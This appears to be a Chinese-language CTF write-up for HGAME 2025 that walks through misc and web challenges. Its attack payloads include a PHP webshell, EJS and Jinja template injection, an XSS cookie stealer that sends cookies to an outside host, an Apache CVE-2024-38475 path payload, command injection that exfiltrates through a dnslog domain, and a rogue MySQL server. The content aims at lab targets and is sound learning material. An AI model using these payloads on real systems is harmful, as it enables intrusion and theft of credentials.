---
title: '2025 HGAME Writeup'
description: 'cybercherf from hex 16进制 解码拿到压缩包'
pubDate: 2025-02-10
author: 'IHK-1'
tags: ['CTF', 'HGAME', '2025']
---

```plain
别交题目中的 flag ！WP 仅供参考
```

# WEEK1
## MISC
### Hakuya Want A Girl Friend
cybercherf from hex 16进制 解码拿到压缩包

文件末尾 png 逆序拿到 图片，校验一下 CRC 

修复宽高拿到图片

密码 To_f1nd_th3_QQ

```plain
hagme{h4kyu4_w4nt_gir1f3nd_+q_931290928}
```

### Level 314 线性走廊中的双生实体
喂给 AI 多次

```plain
flag{s0_th1s_1s_r3al_s3cr3t}
```

### Computer cleaner
切换到 /var/www/html/uploads 发现被上传了一句话木马

```plain
<?php @eval($_POST['hgame{y0u_']);?>
```

分析上传日志，对 ip 进行溯源，发现开放了 http 端口

```plain
Are you looking for me
Congratulations!!!

hav3_cleaned_th3
```

对 shell 操作进行执行

```plain
_c0mput3r!}
```

```plain
hgame{y0u_hav3_cleaned_th3_c0mput3r!}
```

### Two wires ×
不会，而且做出来也碰不到，没有啥实际写的价值

## WEB
### Level 24 Pacman
纯静态页面，分析 /static/scripts/index.js

base64 解码 + 栅栏密码

```plain
hgame{u_4re_pacman_m4ster}
```

### Level 47 BandBomb
对 app.js 路由分析，一个用于上传，另一个用于 rename，重命名文件，测试了一下

可以进行目录穿越，继续审计代码，推测可以模板注入，都是渲染 mortis.ejs 那么可以尝试替换掉 ejs ，进行命令执行

```html
<!DOCTYPE html>
<html lang="en">
  <head>
  </head>
  <body>
    <div>
      <%= process.mainModule.require('child_process').execSync('ls') %>
    </div>
  </body>
</html>
```

上传后进行重命名替换

env 查看环境变量拿到 flag

### Level 69 MysteryMessageBoard
对 shallot 用户爆破得到密码 888888，发现是个留言板

<b>123 测试了一下存在 存储型 XSS

那么思路很清晰，需要获得管理员 cookie，但是没有管理员触发点或者定时机器人，推测有其他路由，进行目录扫描，存在 /admin 路由

分析进行 XSS 后访问 /admin 会以 admin 访问留言板，最开始尝试了多个 xss 平台，xssaq 与 xsspt 发现不太行，尝试自己搭建 XSS 平台

```python
from flask import Flask, request
# <script src="http://86s2d65770.zicp.fun/static/xss.js"></script>
app = Flask(__name__)
app.static_folder = "static"
@app.route('/')
def index_page():
    return request.args.get('cookie')

if __name__ == '__main__':
    app.run("0.0.0.0", port=8000)
```

```javascript
var img = new Image();
img.src = "http://86s2d65770.zicp.fun/?cookie=" + document.cookie;
document.body.appendChild(img);
```

替换 cookie 后访问 /flag 拿到 flag

### Level 25 双面人派对
main 被 UPX 加壳，UPX 4.24 脱壳后，导入 IDA，看到 minio 配置信息

```plain
  endpoint: "127.0.0.1:9000"
  access_key: "minio_admin"
  secret_key: "JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs="
  bucket: "prodbucket"
  key: "update"
```

使用 mc 客户端 进行访问

```plain
mc alias set myminio http://node2.hgame.vidar.club:30156 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=
```

```plain
mc ls myminio
[2025-01-17 09:11:05 EST]     0B hints/
[2025-01-17 09:11:09 EST]     0B prodbucket/
```

访问 hints 有个 src.zip ，将其 cp 到本地，审计代码后推测：

两个服务

服务1：起 minio 的作用，用于更新服务

服务2：main 服务，用于目录浏览 webui

将 main.go 的 . 目录修改为根目录

重新编译后更新

```plain
mc cp '/root/Desktop/update' myminio/prodbucket/update
```

更新后访问 /flag 浏览到根目录 flag 文件内容

### Level 38475 角落
对站点目录进行扫描

```plain
- index.html
- robots.txt
- app.conf

- app
  - index
  - send
  - read
```

根据返回推测是 python 服务器，那么大概率是 SSTI

但是 send 发送后 { 会被 waf

多次测试都无法成功，那么思路到了 那个 apache 的 conf 配置文件

```plain
# Include by httpd.conf
<Directory "/usr/local/apache2/app">
	Options Indexes
	AllowOverride None
	Require all granted
</Directory>

<Files "/usr/local/apache2/app/app.py">
    Order Allow,Deny
    Deny from all
</Files>

RewriteEngine On
RewriteCond "%{HTTP_USER_AGENT}" "^L1nk/"
RewriteRule "^/admin/(.*)$" "/$1.html?secret=todo"

ProxyPass "/app/" "http://127.0.0.1:5000/"
```

其中比较特殊的是这个 RewriteRule，在判断 useragent 为 L1nk/ 开头后会进行跳转

结合 Apache/2.4.59 查找历史漏洞 [https://httpd.apache.org/security/vulnerabilities_24.html](https://httpd.apache.org/security/vulnerabilities_24.html)

分析为 CVE-2024-3847? 这几个连锁的 CVE 编号

在 github 找到一个 exp [https://github.com/p0in7s/CVE-2024-38475](https://github.com/p0in7s/CVE-2024-38475)

```python
r = requests.get(f"{schema}://{url_ip_domain}/{directory}{webroot}/{directory}/{line}{payload}", allow_redirects=False)
```

根据 poc 构建 payload，拿到源码

```plain
http://example.com/admin/usr/local/apache2/app/app.py%3f
```

```python
from flask import Flask, request, render_template, render_template_string, redirect
import os
import templates

app = Flask(__name__)
pwd = os.path.dirname(__file__)
show_msg = templates.show_msg

def readmsg():
    filename = pwd + "/tmp/message.txt"
    if os.path.exists(filename):
        f = open(filename, 'r')
        message = f.read()
        f.close()
        return message
    else:
        return 'No message now.'

@app.route('/index', methods=['GET'])
def index():
    status = request.args.get('status')
    if status is None:
        status = ''
    return render_template("index.html", status=status)

@app.route('/send', methods=['POST'])
def write_message():
    filename = pwd + "/tmp/message.txt"
    message = request.form['message']

    f = open(filename, 'w')
    f.write(message) 
    f.close()

    return redirect('index?status=Send successfully!!')

@app.route('/read', methods=['GET'])
def read_message():
    if "{" not in readmsg():
        show = show_msg.replace("{{message}}", readmsg())
        return render_template_string(show)
    return 'waf!!'

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 5000)
```

审计后，read 在 判断后再次执行 render_template_string(show) 而 show 是重新读取的 readmsg()

所以可以进行条件竞争，直接 打 SSTI，send 与 read 重发拿到 flag

```plain
{{url_for.__globals__['os'].popen('cat /flag').read()}}
```

# WEEK2
## MISC
### Computer cleaner plus
 在 root 目录下，使用 ps 查看进程发现没有权限，目录有个 .hide_command，跟进 服务器给出了带有权限的 root，里面有个 ps，尝试直接执行本地的 ps，发现没有权限执行，跟进 /usr/bin/ps 

```bash
/B4ck_D0_oR.elf & /.hide_command/ps |grep -v "shell" |grep -v "B4ck_D0_oR" |grep "bash"
```

后门为 B4ck_D0_oR

### 串行调试模式
## WEB
### Level 21096 HoneyPot
审计 go 代码，发现是个 数据库管理系统

可疑部分

以及所有可以 交互的地方，大部分都存在 SQL 注入

推测为通过 SQL 注入写入 config 文件，然后访问连接时，进行 RCE

直接搜索发现有预处理，继续审计发现 /api/data 可以进行注入

构造 ` 数据库

```plain
CREATE DATABASE IF NOT EXISTS `%s`", databaseName

SHOW COLUMNS FROM `" + tableName + "`
SELECT COUNT(*) FROM `%s`.`%s`", dbName, tableName
SELECT * FROM `%s`.`%s` LIMIT %d OFFSET %d
SELECT * FROM `%s`.`%s` LIMIT 10", dbName, tableName
```

发现会卡在 SHOW 命令部分，show 命令无法与 select 之类的一起执行，结合题目的 脱库攻击 全部失败，分析攻击点可能并不在这里，尝试攻击其他部分，分析 command 命令执行部分

发现其中 remote password 部分并未进行校验，只是  sanitizeInput   部分过滤了一下

```python
import requests

command = "|| curl $(ls).gxp7by.dnslog.cn ||"

json = {
    "remote_host": "localhost112",
    "remote_port": "3306",
    "remote_username": "root",
    "remote_password": command,
    "remote_database": "test",
    "local_database": "test"
}

url = "http://node1.hgame.vidar.club:31327/api/import"
response = requests.post(url, json=json)
print(response.text)
```

直接 | /writeflag | 命令执行，访问 /flag 拿到 flag

### Level 21096 HoneyPot_Revenge doing
进行 diff 代码，发现上一题的 password 使用 sanitizeInput  过滤，且添加了一部分创建 sql 文件的部分，在检索 HoneyPot 21096 发现 DEFCON32 有一篇演讲稿

[https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Alexander%20Rubin%20Martin%20Rakhmanov%20-%20Atomic%20Honeypot%20A%20MySQL%20Honeypot%20That%20Drops%20Shells.pdf](https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Alexander%20Rubin%20Martin%20Rakhmanov%20-%20Atomic%20Honeypot%20A%20MySQL%20Honeypot%20That%20Drops%20Shells.pdf)

本地构建 mysql ，我们构造蜜罐，当黑客进行 mysqldump 会被服务端命令执行

使用 mysql_mimic 起服务，同时需要注意 mysql_mimic 包内的 variables 添加 net_read_time 

```python
import logging
import asyncio
from sqlglot.executor import execute

from mysql_mimic import Session
from mysql_mimic.variables import GlobalVariables

from mysql_mimic import (
    MysqlServer,
    IdentityProvider,
    NativePasswordAuthPlugin,
    User,
)

logger = logging.getLogger(__name__)

SCHEMA = {
    "test": {
        "x": {
            "a": "INT",
        }
    }
}

TABLES = {
    "test": {
        "x": [
            {"a": 1},
        ]
    }
}

class MyVariables(GlobalVariables):
    def __init__(self):
        super().__init__()
        print(self.list())
        self.set("version", "8.0.0-injection-test\n\\! calc", True)

class MySession(Session):
    def __init__(self):
        super().__init__()
        self.variables = MyVariables()
        self._functions["VERSION"] = "8.1.1"

    async def query(self, expression, sql, attrs):
        result = execute(expression, schema=SCHEMA, tables=TABLES)
        return result.rows, result.columns

    async def schema(self):
        return SCHEMA

class CustomIdentityProvider(IdentityProvider):
    def __init__(self, passwords):
        self.passwords = passwords

    def get_plugins(self):
        return [NativePasswordAuthPlugin()]

    async def get_user(self, username):
        password = self.passwords.get(username)
        if password:
            return User(
                name=username,
                auth_string=NativePasswordAuthPlugin.create_auth_string(password),
                auth_plugin=NativePasswordAuthPlugin.name,
            )
        return None

async def main():
    logging.basicConfig(level=logging.DEBUG)
    identity_provider = CustomIdentityProvider(passwords={"root": "root"})
    server = MysqlServer(identity_provider=identity_provider,session_factory=MySession)
    await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())
```

尝试后可以本地打通

但是 审计go 语言

他会先通过 mysqldump 进行处理再 进行 mysql 连接，而 mysqldump 必然会报错，所以该方法行不通，他会再 export database 就返回，所以只能换思路，通过构建 mysql 

### Level 257 日落的紫罗兰
服务器开启两个，一个 SSH 一个 redis

其中 redis 存在未授权访问，使用 redis 判断存在哪个用户

其中 mysid 用户存在，尝试写入 ssh key

成功连接 SSH

尝试进行提权，多次尝试无果，注意到其中 后台有个 jar 包在运行

拉取 jar 包，通过 JNDI 注入，打 ladp

```plain
curl localhost:8080/search -X POST -d 'baseDN=123&filter=223'
```

